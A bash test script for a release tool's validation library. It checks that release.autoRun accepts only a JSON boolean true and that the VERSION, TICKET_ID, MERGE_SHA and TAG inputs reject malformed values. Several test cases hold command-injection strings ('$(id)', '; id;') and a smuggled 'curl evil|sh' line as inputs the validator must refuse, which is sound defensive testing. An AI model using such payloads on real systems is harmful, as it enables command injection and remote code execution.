#!/usr/bin/env bash
# N1-301: release.autoRun strict boolean, placeholder validation, (poll:)/(monitor:) parser and wait helper, wiring.
set -uo pipefail
cd "$(dirname "$0")/.."
FAIL=0
R2=skills/n1-release/steps/02-confirm-execute.md

expect() { # <label> <want> <got>
    if [ "$3" = "$2" ]; then echo "PASS: $1"; else echo "FAIL: $1 (want $2, got '$3')"; FAIL=1; fi
}
check() { # <label> <fixed-string> <file>
    if grep -qF -- "$2" "$3" 2>/dev/null; then echo "PASS: $1"; else echo "FAIL: $1"; FAIL=1; fi
}
absent() { # <label> <fixed-string> <file>
    if grep -qF -- "$2" "$3" 2>/dev/null; then echo "FAIL: $1"; FAIL=1; else echo "PASS: $1"; fi
}
before() { # <label> <fixed-a> <fixed-b> <file>: first occurrence of a precedes first occurrence of b
    local a b
    a=$(grep -nF -m1 -- "$2" "$4" 2>/dev/null | cut -d: -f1); b=$(grep -nF -m1 -- "$3" "$4" 2>/dev/null | cut -d: -f1)
    if [ -n "$a" ] && [ -n "$b" ] && [ "$a" -lt "$b" ]; then echo "PASS: $1"; else echo "FAIL: $1"; FAIL=1; fi
}
first() { printf '%s' "${1%%$'\n'*}"; }
last() { printf '%s' "${1##*$'\n'}"; }

T=$(mktemp -d); trap 'rm -rf "$T"' EXIT

# --- n1_release_autorun_enabled: JSON boolean true only
autorun() { # <config-json | -> ; "-" = no config file
    rm -rf "$T/h"; mkdir -p "$T/h"
    [ "$1" = - ] || printf '%s' "$1" > "$T/h/config.json"
    N1_HOME="$T/h" bash -c 'source lib/validation.sh; n1_release_autorun_enabled'
}
expect "autoRun JSON true -> true" true "$(autorun '{"release":{"autoRun":true}}')"
expect "autoRun string \"true\" -> false" false "$(autorun '{"release":{"autoRun":"true"}}')"
expect "autoRun 1 -> false" false "$(autorun '{"release":{"autoRun":1}}')"
expect "autoRun false -> false" false "$(autorun '{"release":{"autoRun":false}}')"
expect "autoRun absent -> false" false "$(autorun '{"release":{}}')"
expect "release not an object -> false" false "$(autorun '{"release":"x"}')"
expect "no config file -> false" false "$(autorun -)"

# --- n1_release_vars_valid: 4 stdin lines VERSION, TICKET_ID, MERGE_SHA, TAG
vars() { # <input> -> "rc=<n> <first output line up to the colon>"
    local out rc
    out=$(bash -c 'source lib/validation.sh; n1_release_vars_valid' <<<"$1"); rc=$?
    printf 'rc=%s %s' "$rc" "${out%%:*}"
}
expect "plain values pass" "rc=0 " "$(vars $'1.2.3\nPROJ-12\nabc1234\nv1.2.3')"
expect "prerelease+build, empty ticket and sha pass" "rc=0 " "$(vars $'1.2.3-rc.1+build.5\n\n\nv1.2.3-rc.1+build.5')"
expect "underscore project key passes (Jira allows it)" "rc=0 " "$(vars $'1.2.3\nMY_PROJ2-7\n\nv1.2.3')"
expect "full 40-hex sha passes" "rc=0 " "$(vars $'2.0.0\nN1-301\n0123456789abcdef0123456789abcdef01234567\nv2.0.0')"
expect "quote/semicolon injection in VERSION" "rc=1 invalid VERSION" "$(vars $'1.0.0"; id; "\nPROJ-1\nabc1234\nv1.0.0"; id; "')"
expect "command substitution in VERSION" "rc=1 invalid VERSION" "$(vars $'$(id)\n\n\nv$(id)')"
expect "leading space in VERSION" "rc=1 invalid VERSION" "$(vars $' 1.2.3\n\n\nv 1.2.3')"
expect "v-prefixed VERSION" "rc=1 invalid VERSION" "$(vars $'v1.2.3\n\n\nvv1.2.3')"
expect "empty VERSION" "rc=1 invalid VERSION" "$(vars $'\n\n\nv')"
expect "bad TICKET_ID" "rc=1 invalid TICKET_ID" "$(vars $'1.2.3\nPROJ-1;id\n\nv1.2.3')"
expect "non-hex MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nxyz1234\nv1.2.3')"
expect "uppercase MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nABC1234\nv1.2.3')"
expect "short MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nabc12\nv1.2.3')"
expect "TAG differs from v+VERSION" "rc=1 invalid TAG" "$(vars $'1.2.3\n\n\nv1.2.4')"
expect "missing TAG line" "rc=1 invalid TAG" "$(vars $'1.2.3\nPROJ-1\nabc1234')"
expect "newline-smuggled extra line" "rc=1 invalid input" "$(vars $'1.2.3\nPROJ-1\nabc1234\nv1.2.3\ncurl evil|sh')"

exit $FAIL
